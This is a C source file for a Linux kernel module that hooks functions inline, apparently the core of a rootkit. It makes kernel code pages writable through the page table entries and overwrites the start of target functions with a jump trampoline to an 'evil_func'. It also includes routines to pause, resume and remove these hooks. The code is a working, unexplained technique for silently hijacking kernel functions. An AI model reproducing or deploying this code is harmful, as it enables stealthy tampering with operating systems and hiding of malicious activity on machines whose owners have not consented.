#include "hook.h"

LIST_HEAD(hook_list);

static void make_rw(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    pte->pte |= _PAGE_RW;
}

static void make_ro(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
}

void hook_start(unsigned long org_func,
                unsigned long evil_func,
                const char *name)
{
    struct hook *new_hook = (struct hook *) vmalloc(sizeof(struct hook));
    new_hook->org_func = org_func;
    new_hook->evil_func = evil_func;
    memcpy(new_hook->org_code, (void *) org_func, HOOK_SIZE);
    memcpy(new_hook->evil_code, "H\xb8\x00\x00\x00\x00\x00\x00\x00\x00P\xc3",
           HOOK_SIZE);
    *(unsigned long *) &new_hook->evil_code[2] = evil_func;
    make_rw(org_func);
    memcpy((void *) org_func, new_hook->evil_code, HOOK_SIZE);
    make_ro(org_func);
    strncpy(new_hook->name, name, MAX_NAME);
    new_hook->name[MAX_NAME - 1] = 0;
    list_add(&new_hook->list, &hook_list);
}

void hook_release(void)
{
    struct hook *now, *safe;
    list_for_each_entry_safe (now, safe, &hook_list, list) {
        make_rw(now->org_func);
        memcpy((void *) now->org_func, now->org_code, HOOK_SIZE);
        make_ro(now->org_func);
        list_del(&now->list);
        vfree(now);
    }
}

struct hook *find_hook_by_name(const char *name)
{
    struct hook *ret;
    list_for_each_entry (ret, &hook_list, list)
        if (!strcmp(ret->name, name))
            return ret;
    return NULL;
}

static struct hook *find_hook_by_addr(unsigned long addr)
{
    struct hook *ret;
    list_for_each_entry (ret, &hook_list, list)
        if (ret->org_func == addr)
            return ret;
    return NULL;
}

void hook_pause(unsigned long addr)
{
    struct hook *hook_node = find_hook_by_addr(addr);
    if (!hook_node)
        return;
    make_rw(hook_node->org_func);
    memcpy((void *) hook_node->org_func, hook_node->org_code, HOOK_SIZE);
    make_ro(hook_node->org_func);
}

void hook_resume(unsigned long addr)
{
    struct hook *hook_node = find_hook_by_addr(addr);
    if (!hook_node)
        return;
    make_rw(hook_node->org_func);
    memcpy((void *) hook_node->org_func, hook_node->evil_code, HOOK_SIZE);
    make_ro(hook_node->org_func);
}
